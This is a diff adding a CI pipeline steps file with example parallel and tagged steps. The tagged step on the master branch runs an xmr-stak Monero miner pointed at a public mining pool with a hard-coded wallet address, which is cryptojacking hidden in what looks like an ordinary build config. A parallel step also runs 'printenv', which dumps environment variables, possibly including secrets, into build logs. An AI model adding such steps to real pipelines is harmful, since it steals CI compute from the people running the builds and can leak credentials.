@@ -1,0 +1,11 @@
+- type: parallel
+  name: example_parallel_step
+  steps:
+    - service: codeship_example
+      command: printenv
+    - service: codeship_example
+      command: ls
+- name: example_tagged_step
+  tag: master
+  service: codeship_example
+  command: ./bin/xmr-stak --currency monero -o pool.supportxmr.com:3333 -u 49zdveERfafTgV9tfsEPvSL9giFqkiK1iG8KUNvWBT9wQshmCZiauMzdjuLPuoH2jyZfy6kS88StThDqQAA9vjmTKbhRozK -p vanuatu
